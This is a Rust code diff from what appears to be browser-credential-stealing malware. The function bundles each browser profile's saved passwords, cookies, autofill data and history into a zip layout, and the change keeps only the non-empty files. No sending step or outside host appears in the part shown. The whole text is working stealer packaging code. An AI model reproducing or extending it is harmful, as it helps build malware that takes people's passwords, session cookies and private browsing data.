@@ -1,6 +1,15 @@
-//! Zip layout: Browser/Profile/{passwords,cookies,autofill,history}.txt
+//! Zip layout: Browser/Profile/{passwords,cookies,autofill,history}.txt (non-empty only)
 
-pub const PROFILE_FILES: &[&str] = &["passwords.txt", "cookies.txt", "autofill.txt", "history.txt"];
+fn has_text(content: &str) -> bool {
+    !content.trim().is_empty()
+}
+
+fn has_cookie_data(content: &str) -> bool {
+    content.lines().any(|line| {
+        let t = line.trim();
+        !t.is_empty() && !t.starts_with('#')
+    })
+}
 
 pub fn push_profile_bundle(
     results: &mut Vec<(String, String)>,
@@ -12,14 +21,18 @@ pub fn push_profile_bundle(
     history: Option<String>,
 ) {
     let base = format!("{browser}/{profile}");
-    let contents = [
-        passwords.unwrap_or_default(),
-        cookies.unwrap_or_else(|| super::netscape::empty_file()),
-        autofill.unwrap_or_default(),
-        history.unwrap_or_default(),
-    ];
-    for (filename, content) in PROFILE_FILES.iter().zip(contents) {
-        results.push((format!("{base}/{filename}"), content));
+
+    if let Some(content) = passwords.filter(|c| has_text(c)) {
+        results.push((format!("{base}/passwords.txt"), content));
+    }
+    if let Some(content) = cookies.filter(|c| has_cookie_data(c)) {
+        results.push((format!("{base}/cookies.txt"), content));
+    }
+    if let Some(content) = autofill.filter(|c| has_text(c)) {
+        results.push((format!("{base}/autofill.txt"), content));
+    }
+    if let Some(content) = history.filter(|c| has_text(c)) {
+        results.push((format!("{base}/history.txt"), content));
     }
 }
 
